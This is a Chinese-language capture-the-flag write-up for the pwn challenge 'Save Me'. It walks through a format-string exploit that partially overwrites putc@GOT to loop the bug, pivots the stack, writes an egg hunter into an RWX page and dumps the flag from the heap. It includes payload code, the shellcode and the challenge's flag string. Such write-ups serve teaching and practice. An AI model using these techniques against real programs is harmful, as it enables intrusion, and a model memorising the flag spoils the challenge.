# Save Me

## 题目简述

程序启动时把 flag 读入一个 `malloc(0x50)` 的堆块，然后安装 seccomp，只允许 `read`、`write` 与 `exit_group`。菜单会泄露栈上 `note` 的地址；选择第二项后，用户输入被直接作为 `printf` 的格式串：

```c
scanf("%80s", note);
printf(note);
putc('\n', stdout);
```

题目还预先把 `0x405000` 起的一页映射为 RWX。目标是在没有常规栈溢出的情况下，把执行流引到该页上的 egg hunter，再从堆中找回 flag。

## 解题过程

`printf(note)` 提供位置参数格式串写原语。利用程序给出的栈地址可以算出当前函数保存的 `rbp`：

```python
stack_leak = int(io.recv(14), 16)
saved_rbp = stack_leak + 0x60
```

程序无 PIE，且 `putc@GOT` 可写。第一阶段用 `%10$hn` 修改 `putc@GOT` 的低 16 位，把它指向二进制中的六寄存器弹栈片段：

```python
payload = (
    f"%{0x4015b2 & 0xffff}c%10$hn"
).encode()
payload = payload.ljust(0x10, b"P")
payload += flat(
    exe.got["putc"],
    0x401531,
    saved_rbp + 0x60,
    0, 0, 0, 0,
    0x4014e8,
)
```

`printf` 返回后本应调用 `putc` 输出换行，现在却执行弹栈片段。栈上预先排好的地址负责对齐、迁移 `rbp` 并重新进入输入路径，于是一次性的格式串漏洞变成可重复调用的 2 字节任意写。

第二阶段把 egg hunter 每两个字节拆成一个 `%hn` 写入，从 `0x405024` 开始拼出完整机器码。由于 `scanf("%s")` 遇到空白字符会截断，官方脚本显式拒绝以下字节：

```text
08 09 0a 0b 0c 0d 20
```

写完后再次部分覆盖 `putc@GOT`，令其指向 `0x405024`。egg hunter 的核心逻辑是：

```asm
xor rdi, rdi
push 0x406000
pop rsi
mov dl, 0xff

probe:
    add rsi, 0x1000
    xor rax, rax
    syscall
    cmp al, 0xf2
    je probe

    add rsi, 0x2a0
    inc rdi
    mov al, 1
    syscall
```

它逐页尝试 `read(0, page, 0xff)`。未映射或不可写页面返回 `-EFAULT`，低字节为 `0xf2`；遇到第一张可写堆页后，按本题固定的分配布局加上 `0x2a0`，再用 `write(1, ...)` 输出 flag 所在堆块。

仓库中的 flag 为：

```text
SEKAI{Y0u_g0T_m3_n@w_93e127fc6e3ab73712408a5090fc9a12}
```

## 方法总结

本题把格式串、GOT 劫持、栈迁移和 egg hunting 串成一条利用链。关键不只是获得一次 `%n` 写，而是先把后续 `putc` 改造成栈消费 gadget，使漏洞能够循环；再利用预置 RWX 页保存不含空白字节的探测代码。egg hunter 依赖本题的堆分配偏移，迁移到其他环境时应重新确认目标块相对页首的位置。
